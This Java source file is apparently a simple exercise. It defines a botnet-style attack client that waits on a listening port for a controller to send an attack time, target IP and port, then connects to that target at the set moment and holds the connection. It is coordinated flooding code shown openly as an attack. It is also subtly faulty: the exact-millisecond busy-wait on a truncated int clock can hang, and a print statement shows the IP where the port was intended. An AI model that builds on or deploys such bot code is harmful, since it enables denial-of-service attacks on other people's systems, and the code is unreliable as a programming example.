package client;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.UnknownHostException;

import server.Server;




public class Client implements Attacker {
	
	private static ServerSocket serverSocket;
	private static int portNumb;
	
	private int listeningPort;
	
	private String attackingIP;
	private int attackingPort;
	
	private int TOA;
	
	
	protected static PrintWriter out;
	protected static BufferedReader in;
	protected static BufferedReader stdIn;
	protected static Socket echoSocket;
	
	public Client(int myport){
		this.listeningPort = myport;
	}
	
	/**
	 * Listen on the listening port, once an attack time has been sent, attack!
	 */
	public void getTOA(){
		Socket socket;
		PrintWriter out;
		BufferedReader in;
		
		try {
			serverSocket = new ServerSocket(listeningPort);
			
			socket = serverSocket.accept();
			
			in = new BufferedReader(new InputStreamReader(
					socket.getInputStream()));

			out = new PrintWriter(socket.getOutputStream(), true);
			
			String input = in.readLine();
			TOA = Integer.parseInt(input);
			TOA = (int) (System.currentTimeMillis() + TOA);
			System.out.println(TOA);
			
			this.attackingIP = in.readLine();
			System.out.println(attackingIP);
			
			input = in.readLine();
			this.attackingPort = Integer.parseInt(input);
			System.out.println(attackingIP);
			try {
				socket.close();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			try {
				serverSocket.close();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		this.attack();
		
	}

	/**
	 * Attack on the attacking IP and attacking port.
	 */
	@Override
	public void attack() {
		System.out.println("Waiting for the right time...");
		while(( (int) System.currentTimeMillis()) != TOA){}
			
		System.out.println("The time is now, FIRE!!!");

		try {
			echoSocket = new Socket(attackingIP, attackingPort);
			out = new PrintWriter(echoSocket.getOutputStream(), true);
			in = new BufferedReader(new InputStreamReader(echoSocket.getInputStream()));
			stdIn = new BufferedReader(new InputStreamReader(System.in));
			
			System.out.println("Connected and waiting for 30 secs");;
			out.println("We are coming for you!");

			while(( (int) System.currentTimeMillis()) != (TOA + 30000)){}

			System.out.println("Done, closing connection");

			echoSocket.close();

		} catch (UnknownHostException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		} catch (IOException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}

	}

}
